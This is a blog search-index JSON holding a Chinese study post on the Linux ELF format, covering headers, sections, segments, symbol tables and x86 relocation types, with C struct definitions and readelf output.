{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2021-04-08T07:13:42.902Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"linux_ELF文件格式","slug":"Linux_ELF文件","date":"2021-04-23T06:51:21.917Z","updated":"2021-04-25T15:37:07.879Z","comments":true,"path":"2021/04/23/Linux_ELF文件/","link":"","permalink":"http://example.com/2021/04/23/Linux_ELF%E6%96%87%E4%BB%B6/","excerpt":"","text":"linux_ELF在Linux环境下编译过程一文中简单的提及了linux的ELF文件格式的链接的过程，在此基础上上，本文再次探究ELF文件类型、程序头、节头、符号、重定位、动态链接的内容。 ELF文件格式ELF文件类型 目标文件有三种类型： 可重定位文件（Relocatable File）包含适合于与其他目标文件链接来创建可执行文件或者共享目标文件的代码和数据。 可执行文件（Executable File）包含适合于执行的一个程序，此文件规定了 exec() 如何创建一个程序的进程映像。 共享目标文件（Shared Object File）包含可在两种上下文中链接的代码和数据。首先链接编辑器可以将它和其它可重定位文件和共享目标文件一起处理，生成另外一个目标文件。其次，动态链接器（Dynamic Linker）可能将它与某个可执行文件以及其它共享目标一起组合，创建进程映像。 一个更清晰易懂的ELF格式： 文件开始处是一个ELF 头部（ELF Header），用来描述整个文件的组织。节区部分包含链接视图的大量信息：指令、数据、符号表、重定位信息等等。 程序头部表（Program Header Table），如果存在的话，告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。 节区头部表（Section Heade Table）包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包含节区头部表，其他目标文件可以有，也可以没有这个表。 ELF Header12345678910111213141516171819#define EI_NIDENT (16)typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */&#125; Elf32_Ehdr; 上述的Elf32_Half定义 12/* Type for a 16-bit quantity. */typedef uint16_t Elf32_Half; 其中Elf32_Word的定义 12/* Types for signed and unsigned 32-bit quantities. */typedef uint32_t Elf32_Word; 然后Elf32_Addr与Elf32_Off定义 12345/* Type of addresses. */typedef uint32_t Elf32_Addr;/* Type of file offsets. */typedef uint32_t Elf32_Off; e_ident[EI_NIDENT] 文件的标识以及标识描述了elf如何编码等信息。 1Magic： 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 关于该结构体的索引可以看下面的表格： 名称 取值 目的 EI_MAG0 0 文件标识(0x7f) EI_MAG1 1 文件标识(E) EI_MAG2 2 文件标识(L) EI_MAG3 3 文件标识(F) EI_CLASS 4 文件类 EI_DATA 5 数据编码 EI_VERSION 6 文件版本 EI_PAD 7 补齐字节开始处 EI_NIDENT 16 e_ident[]大小 e_type 该数据类型是uint16_t数据类型的，占两个字节。通过字段查看，可以看到这个值为00 02。表格定义如下： 名称 取值 含义 ET_NONE 0x0000 未知目标文件格式 ET_ERL 0x0001 可重定位文件 ET_EXEC 0x0002 可执行文件 ET_DYN 0x0003 共享目标文件 ET_CORE 0x0004 Core文件(转储格式) ET_LOPROC 0xff00 特定处理器文件 ET_HIPROC 0xffff 特定处理器文件 e_machine 由字段可以看到为00 28，关于这个字段的解析，基本上就是表示该elf文件是针对哪个处理器架构的。 下面只列出几个常见的架构的序号 名称 取值 含义 EM_NONE 0 No machine EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_MIPS 8 MIPS I Architecture EM_PPC 0x14 PowerPC EM_ARM 0x28 Advanced RISC Machines ARM e_version 该字段占四个字节，表示当前文件版本的信息。现在取值为00 00 00 01。从取值上来看 名称 取值 含义 EV_NONE 0 非法版本 EV_CURRENT 1 当前版本 e_entry 这里表示程序的入口地址，目前为四字节，所以通过字段解析到的内容为00 00 80 00。得到可执行程序的入口地址为0x8000。 e_phoff 该字段表示程序表头偏移。占四个字节，根据字段解析，可以查看当前的偏移量为00 00 00 34。也就是实际的偏移量为52个字节。这52个字节其实就是头部的信息数据结构体的大小。 e_shoff 该区域比较重要，记录了section的偏移地址。为四字节，解析出来的字段为0x00 04 24 5c。所以得到地址为0x4245c。 e_ehsize elf文件的头部大小。该取值与头文件结构体的大小相关 e_phnum 目前取值为00 01，这里表示程序头的个数当前只有一个程序头，如果有多个程序头表，那么会在elf头文件之后，也就是52个字节之后，依次向下排列。因为这里是1，所以只有1个程序头。 以下位64位ELF文件头内容 12345678910111213141516171819202122ubuntu@ubuntu:~/code/c_code$ gcc -g test.c -o testubuntu@ubuntu:~/code/c_code$ readelf -h testELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2&#x27;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x530 Start of program headers: 64 (bytes into file) Start of section headers: 8648 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 34 Section header string table index: 33 以上是ELF_Header部分 关于程序头部(Program Header)将在程序加载和动态链接部分介绍 ELF节区（Sections）节区中包含目标文件中的所有信息，除了：ELF头部、程序头部表格、节区头部表格。节区满足以下条件： (1).目标文件中的每个节区都有对应的节区头部描述它，反过来，有节区头部不意味着有节区。 (2).每个节区占用文件中一个连续字节区域（这个区域可能长度为 0）。 (3).文件中的节区不能重叠，不允许一个字节存在于两个节区中的情况发生。 (4).目标文件中可能包含非活动空间（INACTIVE SPACE）。这些区域不属于任何头部和节区，其内容未指定。 这里引入节(section)和段(segment)的区别: 段是程序执行的必要组成成分。 每个段中，会有代码或数据被划分为不同的节。 节头表是对这些节位置和大小的描述，主要用于链接和调试。对于程序执行来说是非必须的，没有节头表程序一九可以正常执行，因为节头表没有对程序内存布局进行布局，对程序布局的描述是程序头表的任务。 如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。 每一个节都保存了某种类型的代码或者数据。数据可以是程序中的全局变量，也可以是链接器所需要的动态链接信息。正如前面提到的，每个ELF目标文件都有节，但是不一定有节头，尤其是有人故意将节头从节头表中删除了之后。当然，默认是有节头的。 节区头部数据结构如下： 12345678910111213typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr; 重要字段： sh_flags 字段 sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等信息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。 取值如下 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ 下面介绍几个重要的节 .text 节 .text节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，.text节就会存在于text段中。由于.text节保存了程序代码，因此节的类型为SHT_PROGBITS。 .rodata 节 .rodata节保存了只读的数据，如一行C语言代码中的字符串。下面这条命令就是存放在.rodata节中的：printf(“Hello World!\\n”); 因为.rodata节是只读的，所以只能存在于一个可执行文件的只读段中。因此，只能在text段（不是data段）中找到.rodata节。由于.rodata节是只读的，因此节类型为SHT_PROGBITS。 .plt 节 本文在动态链接的过程链接表（Procedure Linkage Table，PLT）进行详细介绍。.plt节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于其存在于text段中，同样保存了代码，因此节类型为SHT_PROGBITS。 .data 节 不要将.data节和data段混淆了，.data节存在于data段中，保存了初始化的全局变量等数据。由于其保存了程序的变量数据，因此类型被标记为SHT_PROGBITS。 .bss 节 .bss节保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于.bss节未保存实际的数据，因此节类型为SHT_NOBITS。 .got.plt 节 .got节保存了全局偏移表。.got节和.plt节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。如果攻击者获得了堆或者.bss漏洞的一个指针大小的写原语，就可以对该节任意进行修改。我们将在本问的ELF动态链接部分对此进行讨论。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。 .dynsym 节 .dynsym节保存了从共享库导入的动态符号信息，该节保存在text段中，节类型被标记为SHT_DYNSYM。 .dynstr 节 .dynstr节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代表了符号的名称，以空字符作为终止符。 .rel.*节 重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，对ELF目标文件的某部分内容或者进程镜像进行补充或修改。在本文重定位部分会深入讨论。重定位节保存了重定位相关的数据，因此节类型被标记为SHT_REL。 .hash节 .hash节有时也称为.gnu.hash，保存了一个用于查找符号的散列表。 下面的散列算法是用来在Linux ELF文件中查找符号名的： 123456789uint32.t dl_new_hash(const char *s) &#123; uint32_t h = 5381; for(unsigned char c = *s;c != &#x27;\\0&#x27;; c = *++s) h = h * 33 + c;//Or h = ((h &lt;&lt; 5) + h) + c return h; &#125; .symtab节 .symtab节保存了ElfN_Sym类型的符号信息，本文将在ELF符号和重定位部分详细介绍。.symtab节保存了符号信息，因此节类型被标记为SHT_SYMTAB。 .strtab节 .strtab节保存的是符号字符串表，表中的内容会被.symtab的ElfN_Sym结构中的st_name条目引用。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。 这部分内容在ELF符号具体展开介绍 .shstrtab节 .shstrtab节保存节头字符串表，该表是一个以空字符终止的字符串的集合，字符串保存了每个节的节名，如.text、.data等。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。由于其保存了字符串表，因此节类型被标记为SHT_STRTAB。 字符串表节区包含以NULL（ASCII码0）结尾的字符序列，通常称为字符串。ELF目标文件通常使用字符串来表示符号和节区名称。对字符串的引用通常以字符串在字符串表中的下标给出。 一般，第一个字节（索引为 0）定义为一个空字符串。类似的，字符串表的最后一个字节也定义为 NULL，以确保所有的字符串都以NULL结尾。索引为0的字符串在不同的上下文中可以表示无名或者名字为 NULL的字符串。 允许存在空的字符串表节区，其节区头部的sh_size成员应该为0。对空的字符串表而言，非0的索引值是非法的。 例如：对于各个节区而言，节区头部的sh_name成员包含其对应的节区头部字符串表节区的索引，此节区由ELF 头的e_shstrndx 成员给出。下图给出了包含 25 个字节的一个字符串表，以及与不同索引相关的字符串。 Demo: 表中包含的字符串如下： 索引 字符串 0 无 1 name. 7 Variable 11 able 16 able 24 空字符串 在使用、分析字符串表时，要注意以下几点： 字符串表索引可以引用节区中任意字节。 字符串可以出现多次 可以存在对子字符串的引用 一个字符串可以被引用多次。 字符串表中也可以存在未引用的字符串。 .ctors和.dtors节 .ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。 ELF程序头(Program Header)&amp;段(Segment)执行时ELF视图：可以看到程序头的位置,Segmen段和Section节的映射关系 What’s Program header? ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）的偏移量来得到程序头表，如前面ElfN_Ehdr结构中所示。 可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段或者系统准备程序执行所必需的其它信息。目标文件的“段”包含一个或者多个“节区”，也就是“段内容（Segment Contents）”。程序头部仅对于可执行文件和共享目标文件有意义。 结构体定义如下 1234567891011typedef struct&#123; Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset 相对于ELF文件开头 */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment对齐方式 */&#125; Elf32_Phdr; p_type表示segment的类型。它的可能值如下所示： 1234567891011121314151617181920#define PT_NULL 0 /* Program header table entry unused */#define PT_LOAD 1 /* Loadable program segment */#define PT_DYNAMIC 2 /* Dynamic linking information */#define PT_INTERP 3 /* Program interpreter */#define PT_NOTE 4 /* Auxiliary information */#define PT_SHLIB 5 /* Reserved */#define PT_PHDR 6 /* Entry for header table itself */#define PT_TLS 7 /* Thread-local storage segment */#define PT_NUM 8 /* Number of defined types */#define PT_LOOS 0x60000000 /* Start of OS-specific */#define PT_GNU_EH_FRAME 0x6474e550 /* GCC .eh_frame_hdr segment */#define PT_GNU_STACK 0x6474e551 /* Indicates stack executability */#define PT_GNU_RELRO 0x6474e552 /* Read-only after relocation */#define PT_LOSUNW 0x6ffffffa#define PT_SUNWBSS 0x6ffffffa /* Sun Specific segment */#define PT_SUNWSTACK 0x6ffffffb /* Stack segment */#define PT_HISUNW 0x6fffffff#define PT_HIOS 0x6fffffff /* End of OS-specific */#define PT_LOPROC 0x70000000 /* Start of processor-specific */#define PT_HIPROC 0x7fffffff /* End of processor-specific */ p_flags表示segment的标志。它的可能取值如下所示： 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ 程序头可分为以下几种 下面介绍5种常见的程序头类型： 1.PT_LOAD 一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是说，这种类型的段将被装载或者映射到内存中。 例如，一个需要动态链接的ELF可执行文件通常包含以下两个可装载的段（类型为PT_LOAD）： 存放程序代码的text段； 存放全局变量和动态链接信息的data段。 上面的两个段将会被映射到内存中，并根据p_align中存放的值在内存中对齐。Phdr结构体中的变量描述了段在文件和内存的布局。 2.PT_DYNAMIC——动态段的 Phdr 动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容： 运行时需要链接的共享库列表； 全局偏移表（GOT）的地址——ELF动态链接部分会讨论； 重定位条目的相关信息。 下面是完整的标记名列表 标记名 标记描述 DT_SYMTAB 符号表地址 DT_RELA 相对地址重定位表的地址 DT_RELASZ Rela表的字节大小 DT_RELAENT Rela表条目的字节大小 DT_STRSZ 字符串表的字节大小 DT_SYMENT 符号表条目的字节大小 DT_INIT 初始化函数的地址 DT_FINI 终止函数的地址 DT_SONAME 共享目标文件名的字符串表偏移量 DT_RPATH 库搜索路径的字符串表偏移量 DT_SYMBOLIC 修改链接器，在可执行文件之前的共享目标文件中搜索符号 DT_REL Rel relocs表的地址 DT_RELSZ Rel表的字节大小 DT_RELENT Rel表条目的字节大小 DT_PLTREL PLT引用的reloc类型（Rela或Rel） DT_DEBUG 还未进行定义，为调试保留 DT_TEXTREL 缺少此项表明重定位只能应用于可写段 DT_JMPREL 仅用于PLT的重定位条目地址 DT_BIND_NOW 指示动态链接器在将控制权交给可执行文件之前处理所有的重定位 DT_RUNPATH 库搜索路径的字符串表偏移量 动态段包含了一些结构体，在这些结构体中存放着与动态链接相关的信息。d_tag成员变量控制着d_un的含义。 结构体定义如下： 12345678typedef struct&#123; Elf32_Sword d_tag; union&#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125;d_un; &#125; Elf32_Dyn; extern Elf32_Dyn _DYNAMIC[]; 这部分内容在动态链接部分深入讨论 PT_NOTE PT_NOTE类型的段可能保存了与特定供应商或者系统相关的附加信息。下面是标准ELF规范中对PT_NOTE的定义： 有时供应商或者系统构建者需要在目标文件上标记特定的信息，以便于其他程序对一致性、兼容性等进行检查。SHT_NOTE类型的节（section）和PT_NOTE类型的程序头元素就可以用于这一目的。节或者程序头元素中的备注信息可以有任意数量的条目，每个条目都是一个4字节的目标处理器格式的数组。下面的标签可以解释备注信息的组织结构，不过这些标签并不是规范中的内容。 Tips:这一段值保存了操作系统的规范信息，因为系统会假设一个可执行文件就是本地运行的，可执行文件运行时是不需要这个段的。So this part is vulnerable.:) 4.PT_INTERP PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。例如，/lib/linux-ld.so.2一般是指动态链接器的位置，也即程序解释器的位置。 5.PT_PHDR PT_PHDR段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr对文件（以及内存镜像）中段的描述信息。 至此我们以及了解了节Section和段Segment,下面简单做个小结比较节和段的不同 段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。节头对于程序的执行来说不是必需的，没有节头表，程序仍可以正常执行，因为节头表没有对程序的内存布局进行描述，对程序内存布局的描述是程序头表的任务。节头是对程序头的补充。readelf –l命令可以显示一个段对应有哪些节，可以很直观地看到节和段之间的关系。 如果二进制文件中缺少节头，并不意味着节就不存在。只是没有办法通过节头来引用节，对于调试器或者反编译程序来说，只是可以参考的信息变少了而已。 section：告诉链接器一个部分是否： 要加载到存储器中的原始数据，例如.data，.text等. 或其他部分的格式化元数据，将由链接器使用，但在运行时消失，例如.symtab，.srttab，.rela.text segment：告诉操作系统： 应将段加载到虚拟内存中的哪个位置 段具有哪些权限（读取，写入，执行） 下面用一张图来做个总结，直观地理解ELF_Header、Section、Segment、Phdr、Shdr之间的映射关系 在了解了ELF_Header、Section、Segment、Program_Header而基础上，我们再来介绍ELF符号 ELF符号&amp;重定位符号 符号是对某些类型的数据或者代码（如全局变量或函数）的符号引用。例如，printf()函数会在动态符号表.dynsym中存有一个指向该函数的符号条目。在大多数共享库和动态链接可执行文件中，存在两个符号表。如前面使用readelf –S命令输出的内容中，可以看到有两个节：.dynsym和.symtab。 .dynsym保存了引用来自外部文件符号的全局符号，如printf这样的库函数，.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量，或者代码中定义的本地函数等。因此，.symtab保存了所有的符号，而.dynsym只保存动态/全局符号。 既然.symtab中保存了.dynsym中所有的符号，那么为什么还需要两个符号表呢？使用readelf –S命令查看可执行文件的输出，可以看到一部分节被标记为了A（ALLOC）、WA（WRITE/ALLOC）或者AX（ALLOC/EXEC）。.dynsym是被标记了ALLOC的，而.symtab则没有标记。 ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。.dynsym保存的符号只能在运行时被解析，因此是运行时动态链接器所需要的唯一符号。.dynsym符号表对于动态链接可执行文件的执行来说是必需的，而.symtab符号表只是用来进行调试和链接的，有时候为了节省空间，会将.symtab符号表从生产二进制文件中删掉。 下面介绍ELF文件符号项结构(32位为例): 123456789typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym; 字段 说明 st_name 包含目标文件符号字符串表的索引，其中包含符号名的字符串表示。如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。注：外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。 st_value 此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个绝对值、一个地址等等。 st_size 很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。如果符号没有大小或者大小未知，则此成员为 0。 st_info 此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。 st_other 该成员当前包含 0，其含义没有定义。 st_shndx 每个符号表项都以和其他节区间的关系的方式给出定义。此成员给出相关的节区头部表索引。某些索引具有特殊含义 关于st_info的详细说明： t_info指定符号类型及绑定属性。操纵方式如下： 123#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)#define ELF32_ST_TYPE(i) ((i)&amp;0xf) #define ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf)) st_info的低四位表示符号绑定 可以查阅ELF手册来查看完整的类型以属性列表。符号类型以STT开头，符号绑定以STB开头，下面对几种常见的符号类型和符号绑定进行介绍。 1．符号类型 下面是几种符号类型。 STT_NOTYPE：符号类型未定义。 STT_FUNC：表示该符号与函数或者其他可执行代码关联。 STT_OBJECT：表示该符号与数据目标文件关联 2.符号绑定:用于确定链接可见性和行为 名称 取值 说明 STB_LOCAL 0 局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。 STB_GLOBAL 1 全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的未定义引用。 STB_WEAK 2 弱符号与全局符号类似，不过他们的定义优先级比较低。 STB_LOPROC 13 处于这个范围的取值是保留给处理器专用语义的。 STB_HIPROC 15 处于这个范围的取值是保留给处理器专用语义的。 全局符号与弱符号之间的区别主要有两点： (1).当链接编辑器组合若干可重定位的目标文件时，不允许对同名的STB_GLOBAL 符号给出多个定义。 另一方面如果一个已定义的全局符号已经存在，出现一个同名的弱符号并不会产生错误。链接编辑器尽关心全局符号，忽略弱符号。 类似地，如果一个公共符号（符号的 st_shndx 中包含 SHN_COMMON），那么具有相同名称的弱符号出现也不会导致错误。链接编辑器会采纳公共定义，而忽略弱定义。 (2).当链接编辑器搜索归档库（archive libraries）时，会提取那些包含未定义全局符号的档案成员。成员的定义可以是全局符号，也可以是弱符号。连接编辑器不会提取档案成员来满足未定义的弱符号。 未能解析的弱符号取值为0。 在每个符号表中，所有具有 STB_LOCAL绑定的符号都优先于弱符号和全局符号。符号表节区中的 sh_info 头部成员包含第一个非局部符号的符号表索引。 🙂有点不太懂，涉及这部分的内容需要回头在看 重定位 重定位就是将符号定义和符号引用进行连接的过程。可重定位文件需要包含描述如何修改节内容的相关信息，从而使得可执行文件和共享目标文件能够保存进程的程序镜像所需的正确信息。重定位条目就是我们上面说的相关信息。 我们首先介绍了符号和节相关的内容，因为接下来要讨论的重定位过程需要依赖符号和节。在重定位文件中，重定位记录保存了如何对给定的符号对应代码进行补充的相关信息。重定位实际上是一种给二进制文件打补丁的机制，如果使用了动态链接器，可以使用重定位在内存中打热补丁（hotfix）。用于创建可执行文件和共享库的链接程序/bin/ld，需要某种类型的元数据来描述如何对特定的指令进行修改。这种元数据就存放在前面提到的重定位记录中。 举个栗子: 假设要将两个目标文件链接到一起产生一个可执行文件。obj1.o文件中存放了调用函数foo()的代码，而函数foo()是存放在目标文件obj2.o中的。链接程序会对obj1.o和obj2.o中的重定位记录进行分析并将这两个文件链接在一起产生一个可以独立运行的可执行程序。符号引用会被解析成符号定义，这是什么意思呢？目标文件是可重定位的代码，也就是说，目标文件中的代码会被重定位到可执行文件的段中一个给定的地址。在进行重定位之前，无法确定obj1.o或者obj2.o中的符号和代码在内存中的位置，因此无法进行引用。只能在链接器确定了可执行文件的段中存放的指令或者符号的位置之后才能够进行修改。 重定位表 下面是重定位表项的数据结构（32位为例） 123456789typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; &#125; Elf32_Rel; typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Word r_addend; &#125; Elf32_Rela 重定位表字段说明 成员 说明 r_offset 此成员给出了重定位动作所适用的位置。对于一个可重定位文件而言，此值是从节区头部开始到将被重定位影响的存储单位之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是被重定位影响到的存储单元的虚拟地址。 r_info 此成员给出要进行重定位的符号表索引，以及将实施的重定位类型。例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为“符号值”。重定位类型是和处理器相关的。当程序代码引用一个重定位项的重定位类型或者符号表索引，则表示对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 r_addend 此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值 重定位节区会引用两个其它节区：符号表、要修改的节区。节区头部的sh_info和sh_link成员给出这些关系。不同目标文件的重定位表项对r_offset成员具有略微不同的解释。 (1).在可重定位文件中，r_offset中包含节区偏移。就是说重定位节区自身描述了如何修改文件中的其他节区；重定位偏移 指定了被修改节区中的一个存储单元。 (2).在可执行文件和共享的目标文件中，r_offset中包含一个虚拟地址。为了使得这些文件的重定位表项对动态链接器更为有用，节区偏移（针对文件的解释）让位于虚地址（针对内存的解释）。 尽管对 r_offset 的解释会有少许不同，重定位类型的含义始终不变。 重定位类型 重定位表项描述如何修改后面的指令和数据字段。一般，共享目标文件在创建时，其基本虚拟地址是0，不过执行地址将随着动态加载而发生变化。 重定位的过程按照如下标记： A 用来计算可重定位字段的取值的补齐 B 共享目标在执行过程中，重定位项的符号的地址所处的位置 –全局偏移表的索引 GOT 全局偏移表(GOT)的地址 L 某个符号的过程链接表项的位置（节区偏移地址）。过程连接表项把函数调用重定位到正确的目标位置。链接编辑器构造初始的过程链接表，动态链接器在执行过程中修改这些项目。 P 存储单位被重定位（用r_offset计算）到的位置（节区偏移或者地址） S 其索引位于重定位表项中的符号取值 重定位项的 r_offset 取值给定受影响的存储单位的第一个字节的偏移或者虚拟地址。重定位类型给出那些位需要修改以及如何计算它们的取值。 SYSTEM V仅使用Elf32_Rel重定位表项，在被重定位的字段中包含补齐量。补齐量和计算结果始终采用相同的字节顺序。 X86体系结构下常见重定位类型： 名称 数值 字段 计算 说明 R_386_NONE 0 none none R_386_32 1 word32 S+A R_386_PC32 2 word32 S+A-P R_386_GOT32 3 word32 G+A-P 此重定位类型计算从全局偏移表基址到符号的全局偏移表项之间的距离。它会通知连接编辑器构造一个全局偏移表。 R_386_PLT32 4 word32 L+A-P 此重定位类型计算符号的过程链接表项的地质，并通知链接编辑器构造一个过程链接表。 R_386_COPY 5 word32 none 链接编辑器创建这种重定位类型的目的是支持动态链接。其偏移量成员引用某个可写段中的某个位置。符号表索引规定符号应该既存在于当前目标文件中，也存在于某个共享目标中。在执行过程中，动态链接器把与共享目标的符号相关的数据复制到由偏移给出的位置。 R_386_GLOB_DAT 6 word32 S 此重定位类型用来把某个全局偏移表项设置为给定符号的地址。这种特殊的重定位类型允许确定符号与全局偏移表项之间的关系。 R_386_JMP_SLOT 7 word32 S 链接编辑器创建这种重定位类型主要是为了支持动态链接。其偏移地址成员给出过程链接表项的位置。动态链接器修改过程链接表项的内容，把控制传输给指定符号的地址。 R_386_RELATIVE 8 word32 B+A 链接编辑器创建这种重定位类型是为了支持动态链接。其偏移地址成员给出共享目标中的一个位置，在该位置包含了代表相对地址的一个数值。动态链接器通过把共享目标被加载到的虚地址和相对地址相加，计算对应的虚地址。这种类型的重定位项必须设置符号表索引为 0。 R_386_GOTOFF 9 word32 S+A-GOT 这种重定位类型会计算符号取值与全局偏移表地址间的差。并通知链接编辑器创建一个全局偏移表。 R_386_GOTPC 10 word32 GOT+A-P 此重定位类型与 R_386_PC32 类似，只不过它在计算时采用全局偏移表的地址。在此重定位项中引用的符号通常是_GLOBAL_OFFSET_TABLE_，这种类型也会暗示连接编辑器构造全局偏移表。 程序加载和动态链接这部分内容将符号、重定位和节在ELF格式文件的同一个抽象层次上紧密联系起来。 程序加载 进程除非在执行过程中引用到相应的逻辑页面，否则不会请求真正的物理页面。进程通常会包含很多未引用的页面，因此，延迟物理读操作通常会避免这类费力不讨好的事情发生，从而提高系统性能。要想实际获得这种效率，可执行文件和共享目标文件必须具有这样的段：其文件偏移和虚拟地址对页面大小取模后余数相同 Demo: ​ 可执行文件布局示例 该可执行文件头部段示例如下： 这个例子中，至多四个文件页面包含非纯粹的正文或数据 第一个页面包含ELF头部、程序头部表以及其他信息 最后一个页面包含数据开始部分的一个副本 第一数据页面包含正文段的末尾部分 最后一个数据页面可能包含与运行进程无关的文件信息 操作系统一般会对这些页面做两次映射，以保证每个段的内存访问许可是相同的。数据段的末尾需要对未初始化数据进行特殊处理，系统应该将这些初始化为0 可执行文件与共享目标文件之间的段加载之间有一点不同。可执行文件的段通常包含绝对代码，为了能够让进程正确执行，所使用的段必须是构造可执行文件时所使用的虚拟地址。因此系统会使用p_vaddr作为虚拟地址。 